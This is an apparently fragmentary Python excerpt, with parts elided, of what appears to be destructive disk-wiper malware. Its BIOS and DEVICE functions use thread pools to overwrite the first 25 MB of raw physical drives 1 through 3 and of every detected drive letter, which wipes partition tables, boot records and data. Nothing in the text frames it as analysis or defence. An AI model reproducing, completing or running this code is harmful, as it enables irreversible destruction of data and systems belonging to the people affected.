...
def get_used_disk_size(d):
    ...
    return 26_214_400 if not success else total.value - free.value
...
def BIOS():
    ...
    writef(dev, 5_242_880)
            

def DEVICE():
    with ThreadPoolExecutor(max_workers=3) as pool:
        for t in [pool.submit(writef, f'\\\\.\\PhysicalDrive{n}', 26_214_400) for n in range(1, 4)]:
            t.result()

    disks = get_disks()

    with ThreadPoolExecutor(max_workers=len(disks)) as pool:
        for t in [pool.submit(writef, f'\\\\.\\{n}:', 26_214_400) for n in disks]:
            t.result()
